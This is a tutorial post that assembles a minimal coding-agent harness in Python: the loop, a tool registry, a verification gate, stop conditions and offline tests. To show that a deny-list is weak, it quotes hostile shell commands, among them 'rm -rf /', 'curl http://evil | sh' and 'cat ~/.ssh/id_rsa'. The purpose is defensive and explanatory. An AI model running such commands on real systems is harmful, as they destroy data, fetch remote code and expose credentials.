# 24 · Build #1 — a minimal agent harness from scratch

> **TL;DR.** A real, useful harness is about five hundred lines once you have internalised Parts I to IV. This post assembles one from four primitives already covered: the agent loop, a schema-validated tool registry, a verification gate, and layered stop conditions. The result is an agent that writes code, checks it against tests before declaring done, and stops for the right reason. The full companion is [`code/24-minimal-harness/`](../../code/24-minimal-harness/); it runs offline, and its ten-test suite passes in well under a second with no application programming interface (API) key.
>
> **After reading this you will be able to:**
> - Assemble a working harness from the loop, tools, a verification gate, and stop conditions.
> - Explain why "done" must mean "verified", not "the model said so".
> - Build the seams that let a harness be tested offline, and prove each exit fires.
> - Name what a minimal harness deliberately leaves out, and what its own tests cannot see.

![A block diagram of Build #1: the loop at the centre calls the model and dispatches tool calls through a schema-validated registry to a bash and a write-file tool; a candidate final answer goes to a verification gate that either finishes the run as verified or injects a failure report back into the loop, with four layered stop conditions around it.](diagrams/01-minimal-architecture.svg)
*Four primitives from Parts I to IV, wired into one engine.*

The last three posts of the series build. [Post 20](../20-sdk-landscape/index.md) surveyed the software development kits (SDKs) that ship a harness prebuilt; this post does the opposite and assembles one by hand. Every SDK draws a line between the harness it hands you and the layer you write yourself, and the vendors describing the category draw it in roughly the same place (Databricks, 2026). Writing the given half once is what makes that line visible, after which a feature list stops being a list of nouns.

Nothing here is new machinery. It is the loop of [Post 03](../03-the-agent-loop/index.md), the tools of [Post 06](../06-tools-bash-code/index.md), the verification of [Post 11](../11-verification-loops/index.md), and the exits of [Post 19](../19-loop-engineering/index.md), snapped together. The Context Engineering series ran the same exercise on retrieval in its own Build #1; this is the runtime version of it.

---

## 1. The spec

Build #1 is the honest minimum: an agent that can be handed a small coding task and trusted to finish it correctly or stop trying. That reduces to five requirements, each traceable to an earlier post, and each one preventing a failure mode the series has already named ([Post 05](../05-agent-failure-modes/index.md)).

| The harness must | Because otherwise | Failure mode it prevents |
|---|---|---|
| Call the model repeatedly until a stop condition fires | one call cannot act on a result it has not yet seen | one-shotting |
| Validate every tool call against a schema before executing it | a malformed or hallucinated argument reaches the tool body | destructive action |
| Check the work against ground truth before accepting a final answer | the run ends the moment the model claims to be finished | victory declaration |
| Bound the run by iterations, by tokens, and by a stall signal | a retrying loop burns the budget quietly and forever | doom loop |
| Return counters alongside the answer | a run you cannot cost is a run you cannot budget | (none; this is the input to [Post 23](../23-economics-haas/index.md)) |

That is the whole product. Isolation, deterministic enforcement, human approval, sub-agents and tracing are all out of scope, and all five belong to [Post 25](../25-build-harness-plus/index.md). The constraint that shapes the code more than any of them is a testing one: the whole thing has to run with the network off. That requirement turns out to decide the architecture rather than merely the test suite, which is the argument of §3.

---

## 2. Layout

Before any code, the shape. The package is four modules of engine, a demo, and one test file. Read it in that order and nothing is forward-referenced.

```
code/24-minimal-harness/
├── README.md
├── pyproject.toml                       # zero runtime dependencies
├── src/
│   └── minimal_harness/
│       ├── __init__.py         20       the public surface: one import for everything
│       ├── models.py          108       ModelResponse, ScriptedModel, AnthropicModel
│       ├── tools.py           160       schema validator, registry, bash, write_file
│       ├── verify.py           75       Candidate, VerifyResult, python_function_tests
│       ├── harness.py         108       run(): the loop, the gate, the four exits
│       └── __main__.py         49       the offline demo
└── tests/
    └── test_harness.py        138       ten tests, no network, no key
```

Each module is one primitive from an earlier post, and the mapping is one-to-one apart from `harness.py`, which owns both the loop and the exits because the exits are positions inside the loop rather than a separate component.

| Primitive | Module | Lines | Comes from |
|---|---|---|---|
| The loop: reason, act, observe | `harness.py` | 108 | [Post 03](../03-the-agent-loop/index.md) |
| Layered exits: completed, max-iterations, budget, no-progress | `harness.py` | (the same 108) | [Post 03](../03-the-agent-loop/index.md), [Post 19](../19-loop-engineering/index.md) |
| A schema-validated tool registry, plus a deny-listed bash tool | `tools.py` | 160 | [Post 06](../06-tools-bash-code/index.md) |
| A verification gate, so that "done" means "verified" | `verify.py` | 75 | [Post 11](../11-verification-loops/index.md) |
| The model seam: a normalised response, a scripted double, a live adapter | `models.py` | 108 | [Post 03](../03-the-agent-loop/index.md) |

Five hundred and twenty lines, of which 451 are engine and the rest are the demo and the package exports. The loop function itself is under fifty lines. Keeping it this small is not minimalism for its own sake: it is the only condition under which you can read all of it in one sitting and tell whether the harness does what it claims.

`pyproject.toml` declares no runtime dependencies at all, and the Anthropic adapter sits behind an optional extra, so `pip install -e .` gives a package that imports and tests cleanly on a machine with no provider SDK and no credentials. That is a deliberate property rather than an accident of a small build, and §9 is where you pay for it.

---

## 3. The loop

The engine is the ReAct (reason, act, observe) loop from [Post 03](../03-the-agent-loop/index.md), unchanged in shape: call the model, append its message, and if it asked for tools, run them and feed the results back. The loop maintains a `messages` list in the provider's native format, so swapping the scripted test model for a real one is a thin adapter rather than a rewrite. This is the model-plus-loop framing that the field settled on early (Anthropic, 2024), with the exits and the gate as the parts that make it survivable.

```python
# code/24-minimal-harness/src/minimal_harness/harness.py
def run(model: Model, registry: ToolRegistry, task: str, *,
        system: Optional[str] = None, verify: Optional[Verifier] = None,
        workspace: Optional[Workspace] = None, max_iters: int = 12,
        token_budget: Optional[int] = None, no_progress_window: int = 3) -> Result:
    workspace = workspace if workspace is not None else Workspace()
    messages: list[dict] = [{"role": "user", "content": task}]
    tokens_used = 0
    recent: list[str] = []

    for step in range(1, max_iters + 1):
        # --- REASON ---------------------------------------------------------
        resp = model.respond(system, messages, registry.specs())
        tokens_used += resp.tokens
        messages.append({"role": "assistant", "content": resp.content_blocks})

        # --- the model proposes a final answer: the GATE decides ------------
        if resp.is_final():
            ...                    # printed verbatim in section 5
        ...                        # stops (3) and (4), printed verbatim in section 6

        # --- ACT + OBSERVE --------------------------------------------------
        results = []
        for tu in resp.tool_uses:
            observation = registry.dispatch(tu.name, tu.input)
            results.append({"type": "tool_result", "tool_use_id": tu.id,
                            "content": observation})
        messages.append({"role": "user", "content": results})

    # --- stop (2): the backstop, so a loop can always terminate -------------
    return Result(None, StopReason.MAX_ITERS, False, max_iters, tokens_used,
                  "hit max iterations without passing the gate", messages)
```

The two ellipses stand for blocks printed in full in §5 and §6. Put them back and this is the entire function; nothing else in the companion drives the model.

One detail in the observe step is easy to skip past. Every tool result is wrapped as a `tool_result` block carrying the `tool_use_id` the model's own request supplied, because the provider pairs a call with its result by that identifier, and a bare string in the wrong shape is a request the API rejects.

### Every expensive thing is a seam

The single design decision that shapes the whole companion is that **nothing slow, costly, or dangerous is constructed inside the harness**. The model is a parameter. The shell runner is a parameter, injected into the bash tool. The verifier is a parameter. The workspace is a parameter. Four seams, all visible in the signature above.

That is why the suite runs offline: the tests pass a `ScriptedModel` replaying a fixed list of responses, and a runner that returns a canned string instead of executing anything. The loop cannot tell the difference, which is the point. You are testing *the harness*, and the model is not the part under test.

Three questions turn that from a slogan into a check you can run against your own code:

1. Can the whole suite run with the network disabled?
2. Can it run with `ANTHROPIC_API_KEY` unset, or set to nonsense?
3. Does any test in it take longer than a second?

Build #1 answers yes, yes, and no: `python -m pytest -q` reports `10 passed` in a few hundredths of a second. The third question does the real work, because a harness can have a seam and still not use it. A suite that takes ninety seconds is telling you something in it is talking to a network, and a test that talks to a network is one that gets deleted the first week it goes red for a reason nobody can reproduce.

The seam has to be there from the first commit, because a harness that constructs its own model cannot be driven by a fake one and adding the seam afterwards touches every call site. It also buys less than it looks like. [Post 14](../14-permissions-sandboxes/index.md) §1 records that Build #2's sandbox once shipped with a bypass, invisible because every test injected a fake runner and nothing exercised the real executor. Seams make a harness testable; they do not make the code behind the seam tested, and §8 returns to that.

---

## 4. The bash and file tools

Tools are the ACT step of the loop ([Post 06](../06-tools-bash-code/index.md) §1). Build #1 ships two: a `write_file` tool that puts content into the workspace, and a deny-listed `bash` tool with an injectable runner. Both go through a `ToolRegistry` whose `dispatch` is the whole discipline in one method.

```python
# code/24-minimal-harness/src/minimal_harness/tools.py
    def dispatch(self, name: str, tool_input: dict) -> str:
        """Validate, then execute. Returns an observation string; never raises."""
        tool = self._tools.get(name)
        if tool is None:
            return f"error: unknown tool '{name}'"
        problems = validate(tool_input, tool.input_schema)
        if problems:
            return "error: invalid input: " + "; ".join(problems)
        try:
            return tool.run(tool_input)
        except Exception as e:  # a tool must not crash the loop
            return f"error: {type(e).__name__}: {e}"
```

Ten lines, and every branch returns a string. That is the property the loop depends on: a bad tool name, a malformed argument, a blocked command and an exception inside the tool body all come back as observations the model can reason about rather than as a traceback that ends the run. It is the return-value half of the tool contract ([Post 06](../06-tools-bash-code/index.md) §8), and the reason a harness with it degrades where one without it stops.

The schema is the other half. Here is the bash tool's, in full:

```python
# code/24-minimal-harness/src/minimal_harness/tools.py
    return Tool(
        "bash",
        "Run a shell command and return its combined output. Dangerous commands "
        "are refused.",
        {"type": "object", "properties": {"command": {"type": "string"}},
         "required": ["command"], "additionalProperties": False},
        run,
    )
```

Two clauses in that JavaScript Object Notation (JSON) Schema object do the enforcement, and they catch opposite mistakes. `required` catches an argument the model left out. `additionalProperties: false` catches an argument the model invented, which is the more interesting of the two: a model that has seen a hundred shell tools in training will cheerfully send a `cmd` key, and a validator that only checks what it knows about passes that through with the real argument missing. The companion's `validate` implements both directions, and `test_validate_catches_missing_and_extra_properties` asserts both.

What each of those returns is worth tabulating, because these strings are the agent's entire view of a failed call.

| The call | What `dispatch` returns | What refused it |
|---|---|---|
| `{"command": "echo hi"}` on a tool named `grep_files` | `error: unknown tool 'grep_files'` | the registry, before any schema work |
| `{"cmd": "echo hi"}` on `bash` | `error: invalid input: $: missing required property 'command'; $: unexpected property 'cmd'` | the validator, before the runner is touched |
| `{"command": "rm -rf /"}` | `blocked: command matches a deny-list rule (\brm\s+-[rf])` | the tool body's deny-list |
| a command whose runner times out | `error: TimeoutError: timed out after 10.0s` | the tool body's `try` around the injected runner |
| a command that exits non-zero | `(exit 2) nope` | nothing; a non-zero exit is data, not an error |

The last row is the one people get wrong. A failing command is not a harness fault, and turning it into one hides the exit code from the only party that can act on it.

---

## 5. The verification gate

This is the component that separates Build #1 from a toy. A bare loop exits the moment the model stops calling tools, which is to say the moment it *claims* to be done. That is a victory declaration waiting to happen ([Post 05](../05-agent-failure-modes/index.md)). The gate makes "done" mean "verified".

![A four-step sequence: the model writes a buggy is_palindrome and declares done; the gate runs the tests and fails; the report is injected and the model writes the fix; the gate re-runs and passes, stopping the run as verified. Below, the five reports the gate can actually return, taken from verify.py in the code companion: no file written at the expected path, the file failing to import with the exception named, no callable of the expected name, a case raising, and a case returning the wrong value quoting both what it returned and what was expected. A panel explains why: a bare failure gives the model nothing to correct against, while each of these names the case, what it returned and what was wanted.](diagrams/02-task-run-sequence.svg)
*Without the gate, the run ends on the model's first claim of done and ships the bug.*

Here is the block §3 elided, verbatim:

```python
# code/24-minimal-harness/src/minimal_harness/harness.py
        # --- the model proposes a final answer: the GATE decides ------------
        if resp.is_final():
            candidate = Candidate(resp.text, workspace)
            verdict = verify(candidate) if verify else VerifyResult(True)
            if verdict.ok:
                # stop (1): the only exit that returns verified work
                return Result(resp.text, StopReason.COMPLETED, True, step,
                              tokens_used, "", messages)
            # gate failed: feed the report back as the next observation and
            # keep going (Post 11). The failure is verbose; success is silent.
            messages.append({"role": "user",
                             "content": f"verification failed: {verdict.report}"})
            recent.clear()  # a real correction is progress; reset the detector
            if token_budget is not None and tokens_used >= token_budget:
                return Result(None, StopReason.BUDGET, False, step, tokens_used,
                              "token budget exhausted", messages)
            continue
```

Thirteen lines of code, and three ideas in them.

**A candidate is the answer plus the work.** `Candidate` carries `resp.text` and the whole workspace, because the model's prose is not the artefact. A claim that `is_palindrome` was implemented is unfalsifiable; the file the claim refers to is not.

**A verifier is a function from a candidate to a verdict.** That contract is the reusable part of this build. Anything taking a `Candidate` and returning a `VerifyResult` is a gate, which is why swapping a test-runner gate for a schema check or a judge is a one-function change and not a change to the loop.

**Failure is verbose and success is silent** ([Post 11](../11-verification-loops/index.md) §4; the phrasing is Osmani's, 2026). `VerifyResult(True)` carries an empty report. A rejection carries everything the model needs, and the shipped verifier builds it one failing case at a time:

```python
# code/24-minimal-harness/src/minimal_harness/verify.py
        failures = []
        for args, expected in cases:
            try:
                got = fn(*args)
            except Exception as exc:
                failures.append(f"{fn_name}{args!r} raised {type(exc).__name__}: {exc}")
                continue
            if got != expected:
                failures.append(f"{fn_name}{args!r} == {got!r}, expected {expected!r}")
        if failures:
            return VerifyResult(False, "; ".join(failures))
        return VerifyResult(True)
```

That one f-string is why the demo's model produces a fix rather than a guess. `is_palindrome('abc',) == True, expected False` gives the input, the actual and the expected, which is the minimum a report needs to be actionable. A bare boolean gate hands back the word "no", and forces the next turn to be a re-derivation from scratch. The independent evaluator of [Post 12](../12-planner-generator-evaluator/index.md) needs the same property for the same reason.

### Choosing the verifier

Build #1 hardcodes function-test execution because the demo task is a pure function, the easiest gate in existence. [Post 11](../11-verification-loops/index.md) §8 gives the test for whether a task admits a gate at all; the table below is the narrower question of what plugs into this seam once it does.

| Ground truth | The verifier, concretely | Cost per gate call | What Build #1 would need |
|---|---|---|---|
| Test cases against a written function | `python_function_tests`, shipped | microseconds, in-process | nothing; this is the default |
| A real test suite | a function that shells out to `pytest -q` and reads the exit code | seconds, and a timeout of its own | a live runner and an on-disk workspace (§9) |
| A schema, for structured output | `validate` from `tools.py`, pointed at the answer instead of a tool call | microseconds | ten lines; the validator already exists |
| An independent judge, for prose | a second model call scoring against a written contract | one model call, plus a positive skew of its own | a second model and a rubric ([Post 12](../12-planner-generator-evaluator/index.md)) |
| None available | `verify=None` | free, and worth exactly that | an honest verdict field (§8) |

The rows are in cost order, and that ordering is the advice: reach for the cheapest verifier that can settle the question, and add an expensive one only where the cheap one is silent.

---

## 6. Layered stop conditions

A loop that can retry forever is a doom loop with extra steps. Build #1 has four layered exits, from [Post 03](../03-the-agent-loop/index.md) §7 and [Post 19](../19-loop-engineering/index.md) §2.

| Exit | `StopReason` | What fires it | What the result carries |
|---|---|---|---|
| (1) verified goal | `COMPLETED` | a final answer the gate accepted | the answer, and `verified` true |
| (2) iteration cap | `MAX_ITERS` | `max_iters` turns spent without a pass | the transcript, and nothing verified |
| (3) budget | `BUDGET` | `tokens_used` has reached `token_budget` | the spend to date |
| (4) no-progress | `NO_PROGRESS` | the same tool-call signature, three turns running | the repeating signature |

Here is the second block §3 elided, verbatim, sitting between the gate and the act step:

```python
# code/24-minimal-harness/src/minimal_harness/harness.py
        # --- stop (3): a real cost ceiling, checked before spending more ----
        if token_budget is not None and tokens_used >= token_budget:
            return Result(None, StopReason.BUDGET, False, step, tokens_used,
                          "token budget exhausted", messages)

        # --- stop (4): thrashing, same tool calls, no change, N turns -------
        recent.append(_signature(resp.tool_uses))
        window = recent[-no_progress_window:]
        if len(window) == no_progress_window and len(set(window)) == 1:
            return Result(None, StopReason.NO_PROGRESS, False, step, tokens_used,
                          "no progress: identical tool calls repeating", messages)
```

The exits are the safety surface, which is why the suite forces each one individually (§8). Three details in how they interact are load-bearing and easy to miss.

### A real correction resets the stall detector

When the gate rejects and the report goes back, the gate block calls `recent.clear()`. Without that line, an agent that fixes a bug and re-submits looks to the detector like an agent repeating itself, and the run gets killed for making progress. Any stall detector sitting alongside a retry loop needs this. Neither feature is wrong on its own; the bug lives in the join, which is why it appears only once both features do.

### The budget check has to sit on both paths

A rejected final answer is a spent model call like any other, which is why the budget check appears twice: once above the act step, and once inside the gate block. It has not always. An earlier version of the companion checked the budget only on the tool-call path, so a model that kept declaring done and kept failing the gate never reached the check, and the run spent to `max_iters` instead. The stated ceiling silently became an iteration ceiling, a different number with a different cost.

With the check on both paths the bound is one iteration of overshoot, because `tokens_used` already includes the call that just returned, so the check stops the *next* iteration rather than the one that crossed the line. Measured against an always-rejecting gate with `token_budget=2000` and `max_iters=40`:

| Tokens per rejected turn | Iteration that fires `BUDGET` | Tokens actually spent | Overrun on the 2,000 ceiling |
|---|---|---|---|
| 600 | 4 | 2,400 | 20% |
| 1,500 | 2 | 3,000 | 50% |
| 2,500 | 1 | 2,500 | 25% |

The overrun is bounded by the cost of one call rather than by a percentage, so it grows with the size of the turn. That is the right trade for a minimal build, and it is not the same as a hard ceiling: [Post 19](../19-loop-engineering/index.md) §4 shows the version that reserves for the next call and never crosses at all, which is worth doing as soon as one iteration is expensive enough to notice.

One path deliberately has no budget check: a final answer that *passes* the gate returns `COMPLETED` however much it cost. Discarding verified work you have already paid for, to enforce a ceiling you have already crossed, helps nobody.

### What the detector compares decides what it catches

The no-progress signal is one line:

```python
# code/24-minimal-harness/src/minimal_harness/harness.py
def _signature(tool_uses: list[ToolUse]) -> str:
    """A stable fingerprint of a turn's tool calls, for no-progress detection."""
    return json.dumps([[tu.name, tu.input] for tu in tool_uses], sort_keys=True)
```

It fingerprints the *requests*, never the observations; the loop does not compare results at all. That is the cheapest of the three stall signals in [Post 19](../19-loop-engineering/index.md) §5, and it has the failure profile that goes with cheapness, in both directions:

- **A false positive.** An agent legitimately polling the same command against a changing world is killed as thrashing. Driving the harness with `bash: git status` on every turn stops at iteration 3 with `no_progress`, even though the world underneath it may be changing on every call.
- **A false negative.** An agent varying its arguments while achieving nothing sails past. Twenty turns of `echo 0`, `echo 1`, `echo 2` produce twenty distinct signatures and run to `max_iters`, spending the full budget on nothing.

The two better signals are the observable effect, meaning whether anything changed on disk, and the verifier's score across iterations. Build #1 implements neither, so read its detector as the default rather than the answer. The window of three, rather than one, is the tolerance that keeps a single retry after a transient error from reading as a stall; it is not enough to save the polling agent above.

---

## 7. Running it on a real task

The demo is the smallest task that exercises the whole engine: write `is_palindrome`, get it wrong, get caught, fix it. Add `src` to the Python path or run `pip install -e .` first, then `python -m minimal_harness`. The program prints the raw message list, so assistant turns come out as content-block dictionaries. Abridged to the parts that matter, with the block dictionaries collapsed:

```
[user     ] Write is_palindrome(s) in solution.py and make it correct.
[assistant] "Here is a first attempt." + write_file{solution.py: "return s == s  # bug"}
[user     ] tool_result tu_1: wrote 60 bytes to solution.py
[assistant] "Done — is_palindrome is implemented."
[user     ] verification failed: is_palindrome('abc',) == True, expected False
[assistant] "Fixing: compare against the reverse." + write_file{solution.py: "return s == s[::-1]"}
[user     ] tool_result tu_1: wrote 46 bytes to solution.py
[assistant] "Fixed and it should pass now."

stop_reason : completed
verified    : True
iterations  : 4
tokens_used : 54
```

Four moments in that transcript are worth reading individually.

**Iteration 2 is the whole post.** The model said "Done", and on a bare loop that sentence ends the run and ships `s == s`. Here it ends nothing: the gate runs, the check fails, and the claim is overruled by a function that does not care what the model believes.

**The failure report is specific enough to act on.** The fifth line does not stop at "verification failed"; it names all three of the values §5 called the minimum for an actionable report, so the next move is a targeted fix. Note also that it arrives as an ordinary user message rather than as a `tool_result`, because no tool was called on that turn. The gate is part of the harness, not part of the tool surface.

**The run ends `completed` and also `verified`.** Two separate fields, deliberately. `completed` means the loop reached its intended exit; `verified` means the gate said yes. A harness where those are one field cannot express "the loop finished but the work is unchecked". Build #1 gets this half right and half wrong, which §8 takes apart.

**Four iterations, fifty-four tokens.** The counters are on the result because the budget exit needs them anyway, and because a run nobody meters is a run nobody can budget ([Post 23](../23-economics-haas/index.md)). Be clear about what these particular numbers are: the demo's token counts are hand-set on each scripted response so the run is deterministic. Live, they come from `usage.input_tokens + usage.output_tokens` in the Anthropic adapter, and the arithmetic has the same shape three orders of magnitude larger.

---

## 8. Tests: what the suite pins down, and what it cannot see

A harness is only trustworthy if you can prove it stops. "It has stop conditions" is a claim; a test that drives the loop into each exit on purpose is evidence. The suite is one file and it does exactly that.

```python
# code/24-minimal-harness/tests/test_harness.py
FIXED = "def is_palindrome(s):\n    return s == s[::-1]\n"
BUGGY = "def is_palindrome(s):\n    return True\n"


def _palindrome_verifier():
    return python_function_tests(
        "solution.py", "is_palindrome",
        [(("racecar",), True), (("abc",), False), (("",), True)],
    )


def test_gate_rejects_then_accepts_after_feedback():
    ws = Workspace()
    reg = ToolRegistry([make_write_file_tool(ws)])
    model = ScriptedModel([
        tool_response("write_file", {"path": "solution.py", "content": BUGGY}),
        text_response("done (but it is wrong)"),
        tool_response("write_file", {"path": "solution.py", "content": FIXED}),
        text_response("fixed"),
    ])
    res = run(model, reg, "write it", verify=_palindrome_verifier(), workspace=ws)
    assert res.stop_reason is StopReason.COMPLETED
    assert res.verified is True
    # the rejection was fed back into the transcript as an observation
    feedback = [m for m in res.transcript if m["role"] == "user"
                and isinstance(m["content"], str)
                and "verification failed" in m["content"]]
    assert feedback, "the failing gate report should be injected back into the loop"


def test_no_progress_detection():
    reg = ToolRegistry([make_bash_tool(runner=lambda c, t: ("same", 0))])
    script = [tool_response("bash", {"command": "echo same"}, id="b", tokens=1)
              for _ in range(20)]
    res = run(ScriptedModel(script), reg, "thrash", max_iters=20,
              no_progress_window=3)
    assert res.stop_reason is StopReason.NO_PROGRESS
    assert res.iterations == 3
```

Both tests have the shape every harness test should have: construct a model that will provoke exactly one behaviour, run the harness, and assert on the stop reason rather than on the output. Neither asserts anything about what the model said; the transcript assertion in the first is about the harness injecting the report, not about the model reacting well to it.

Ten tests, and each names a behaviour rather than a function.

| The test | What it forces |
|---|---|
| `test_gate_passes_verified_solution` | the intended exit: a final answer that passed |
| `test_gate_rejects_then_accepts_after_feedback` | rejection, an injected report, and recovery |
| `test_no_verifier_means_final_answer_completes` | the degenerate case, so the gate is opt-in rather than assumed |
| `test_max_iters_backstop_when_gate_never_passes` | the loop terminates when the gate never passes |
| `test_budget_stops_the_run` | the cost ceiling fires on the tool-call path |
| `test_budget_stops_the_run_when_the_gate_keeps_rejecting` | the same ceiling fires on the gate-rejection path (§6) |
| `test_no_progress_detection` | the thrashing detector fires, at the third repeat |
| `test_bash_tool_denies_dangerous_commands` | the deny-list refuses, and lets a safe command through |
| `test_schema_rejects_malformed_tool_call` | a bad call is an observation, not a crash |
| `test_validate_catches_missing_and_extra_properties` | the schema is enforced in both directions |

Rows five and six are the pair worth studying, because for a long time only row five existed and the exit it claimed to test was reachable on one path out of two. A test table is exactly as good as the paths it covers, and a column of green ticks is a comfortable way not to notice a gap.

### What the suite structurally cannot see

Naming this is part of shipping the suite, because ten green tests otherwise read as covering ten times more than they do.

- **The live model and the real shell are never executed.** Every test injects a double, so `AnthropicModel` and `subprocess_runner` have zero coverage by construction. That is the same hole that let Build #2 ship a sandbox bypass ([Post 14](../14-permissions-sandboxes/index.md) §1): the seam buying the fast suite is also the seam hiding the code behind it.
- **`ScriptedModel` ignores the messages it is given.** No test can therefore detect a prompt regression, a transcript the provider would reject, a lost `tool_use_id` pairing, or a context grown past the window. The harness could be assembling nonsense and every test would still pass.
- **The deny-list is tested against the deny-list.** `test_bash_tool_denies_dangerous_commands` asserts that `rm -rf /` is refused. It says nothing about what is not on the list, and §10 has the measured answer.
- **One test pins a field that lies.** `test_no_verifier_means_final_answer_completes` asserts `res.verified is True` for a run in which nothing verified anything, because `run` computes `verdict = verify(candidate) if verify else VerifyResult(True)`. The state §7 said the two fields exist to make visible, work finished but unchecked, is the one state they cannot express. The fix is to let the field say "not checked": make `verified` three-valued, true on a pass, false on a rejection carried to another exit, and null when no gate ran. The rule generalises to every status flag you will ever add: a boolean that defaults to the good value lies in precisely the case you invented it for.

---

## 9. Making it live

The central design claim of §3 is that four seams make the swap to production cheap. Here is the swap, and its price.

![A four-row table of the seams that make the build swappable, with columns for the seam, what the tests inject, what production injects, and what the swap widens. Model: a ScriptedModel replaying a fixed list in tests, an AnthropicModel plus an install and a key in production, which makes the run non-deterministic and metered. Shell runner, marked as the widest: a function returning a canned string in tests, subprocess_runner with a real shell in production, after which commands execute behind eight regexes that are a pre-filter rather than a boundary. Workspace: a dictionary of path to text in tests, with no shipped live implementation, so files only outlive the run once you write the durable one. Verifier: python_function_tests in-process in tests, a shell-out to the project suite in production, costing seconds per gate call.](diagrams/03-the-four-seams.svg)
*A seam is a slot with two sides. Three of the four have a live implementation waiting; the workspace is the one Build #1 leaves for you, and the runner is the one that widens the blast radius most.*

| Seam | The double the tests inject | The live version | What changes about your risk |
|---|---|---|---|
| Model | `ScriptedModel`, replaying a fixed list | `AnthropicModel()`, plus `pip install .[anthropic]` and a key in the environment | the run becomes non-deterministic and metered |
| Shell runner | a function returning a canned string | `subprocess_runner` | commands execute for real, with `shell=True`, behind eight regexes |
| Workspace | `Workspace`, a dictionary of path to contents | a real directory | files outlive the run, and can be overwritten or deleted |
| Verifier | `python_function_tests`, in-process | a shell-out to the project's own suite | seconds per gate call, and a timeout you must set |

Reading the figure by column rather than by row is the useful move: the left two columns are what makes the suite fast and offline, and the right-hand column is the entire price of leaving that comfort. The code is one file you write yourself; nothing in the package changes.

```python
# live.py
from minimal_harness import (AnthropicModel, ToolRegistry, Workspace, run,
                             make_bash_tool, make_write_file_tool,
                             subprocess_runner, python_function_tests)

workspace = Workspace()
registry = ToolRegistry([
    make_write_file_tool(workspace),
    make_bash_tool(runner=subprocess_runner, timeout=10.0),   # a real shell
])

result = run(AnthropicModel(), registry,
             "Write is_palindrome(s) in solution.py and make it correct.",
             verify=python_function_tests("solution.py", "is_palindrome",
                                          [(("racecar",), True), (("abc",), False)]),
             workspace=workspace, max_iters=12, token_budget=200_000)
print(result.stop_reason, result.verified, result.tokens_used)
```

That file swaps three of the four seams and leaves the fourth alone, because the workspace is the one seam Build #1 ships no live implementation for. `Workspace` is a dictionary, so making files durable means writing a filesystem-backed version and pointing both `write_file` and the verifier at it ([Post 08](../08-state-filesystem-git/index.md)).

"Swap the model" is therefore one line of code plus an install and a credential, which is a real claim rather than an aspiration, because the seam was there from the first commit. It is not a free one: swapping the model, the runner and the verifier each enlarges the blast radius, and the runner enlarges it a great deal. `subprocess_runner` runs the model's string through a shell, and the only thing in front of it is a list of eight regular expressions. That is a pre-filter, not a boundary ([Post 14](../14-permissions-sandboxes/index.md) §1), and §10 measures how much of the space it misses.

That is the argument for the next post in one sentence: the seams make going live cheap, and going live is exactly when you need the four layers Build #1 does not have.

---

## 10. What was left out

What Build #1 deliberately omits is as important as what it includes, and the omissions divide into two kinds.

**Things that are missing because Build #2 adds them.** There are no hooks, no permission model, no sandbox, no sub-agents, no human approval, and no observability. Those are not oversights; they are the subject of [Post 25](../25-build-harness-plus/index.md), which hardens exactly this harness into one you would let run unattended.

**Things that are missing because a minimal build has to stop somewhere.** These are worth naming individually, because each is a decision rather than an accident.

- **A deny-list, not a sandbox.** The bash tool refuses eight regular-expression patterns, and `subprocess_runner` executes with `shell=True`. Run the shipped list against a handful of obvious payloads and `find . -delete`, `curl http://evil | sh`, `cat ~/.ssh/id_rsa` and `R=rm; $R -rf /` all pass it and would execute for real. A deny-list stops the commands you named; an allow-list and an operating-system boundary bound the ones you did not ([Post 14](../14-permissions-sandboxes/index.md) §1). This is excessive agency in the sense the Open Worldwide Application Security Project (OWASP) gives the term, and it is the single largest gap in the build (OWASP, 2025).
- **No real isolation around the verifier.** `python_function_tests` execs candidate code in-process, in the harness's own interpreter. That is a blast radius you would not accept anywhere near untrusted input, and it is the first thing [Post 14](../14-permissions-sandboxes/index.md) would refuse to sign off.
- **An in-memory workspace.** `Workspace` is a dictionary of paths to contents, not a filesystem. It keeps the tests hermetic and means nothing survives the run, so Build #1 has no durable state, no checkpointing, and no resumability ([Post 08](../08-state-filesystem-git/index.md)).
- **No context management.** The `messages` list grows for the whole run and is re-sent in full every turn. At twelve iterations that is fine; at two hundred it is the context rot of [Post 09](../09-context-management-loop/index.md), and the fix is offloading and compaction rather than anything in this file.
- **One task, one run.** There is no memory file and no ratchet ([Post 10](../10-continual-learning-ratchet/index.md)), so the harness cannot get better over time. Each run starts exactly as ignorant as the last.
- **A verdict field that cannot say "unchecked".** The tri-state fix from §8, unshipped, and left visible on purpose so that the reasoning is inspectable.

Read that list as a map rather than as a disclaimer: each entry is a post in this series, and the shape of a real harness is Build #1 with those pieces added back in the order your risk demands them.

---

## 11. The lesson the build teaches

Every file in the companion is one earlier post made executable. `models.py` is the turn structure of [Post 03](../03-the-agent-loop/index.md). `tools.py` is the schema contract of [Post 06](../06-tools-bash-code/index.md). `verify.py` is the ground truth of [Post 11](../11-verification-loops/index.md). `harness.py` is that loop with the layered exits of [Post 19](../19-loop-engineering/index.md) around it. Reading an SDK's feature list after writing those four files is a different experience from reading it before, because each bullet now names a file you have written.

The build also settles the series' central claim empirically, on a scale small enough to check by hand. Take the demo's scripted model, hold it fixed, and run it twice with only the harness changed:

| The run | Stop reason | Verified | Iterations | Tokens | The file it leaves behind |
|---|---|---|---|---|---|
| `verify=None` | `completed` | reported true | 2 | 28 | `return s == s`, the bug |
| the palindrome gate | `completed` | true | 4 | 54 | `return s == s[::-1]`, correct |

Same model, same script, same tools, same task. The difference between shipping a bug and shipping a correct function is thirteen lines of gate, two extra iterations, and twenty-six tokens. Nothing about the model improved, and the output did.

That is `Agent = Model + Harness` in a form you can run (Trivedy, 2026; Osmani, 2026). It is also the reason the rest of the series is worth reading: everything after this post is a way of adding capability or subtracting risk on the harness side of that equation, where the returns are engineering rather than procurement.

What the build still cannot do is the other half of the lesson. It cannot contain a command it did not anticipate, it cannot survive a context longer than a dozen turns, it cannot remember anything between runs, it cannot tell you what it did after the fact, and it cannot honestly report that nothing checked its work. Five clauses, five posts, and the next one starts on the first of them.

---

## Common pitfalls

- **Constructing the model inside the harness.** Without a seam the loop cannot be tested offline, and adding one later touches every call site (§3). The mirror-image mistake is trusting the seam too far: `AnthropicModel` and `subprocess_runner` have no coverage at all, and that gap shipped a real sandbox bypass in Build #2 (§8; [Post 14](../14-permissions-sandboxes/index.md)).
- **A stall detector that counts a correction as a repeat.** Reset it when the gate rejects, or the loop kills runs that are making progress (§6).
- **A budget check on only one path.** A ceiling that a gate-rejection loop can walk around is not a ceiling; and even on both paths it bounds the overrun to one call rather than preventing it (§6; [Post 19](../19-loop-engineering/index.md) §4).
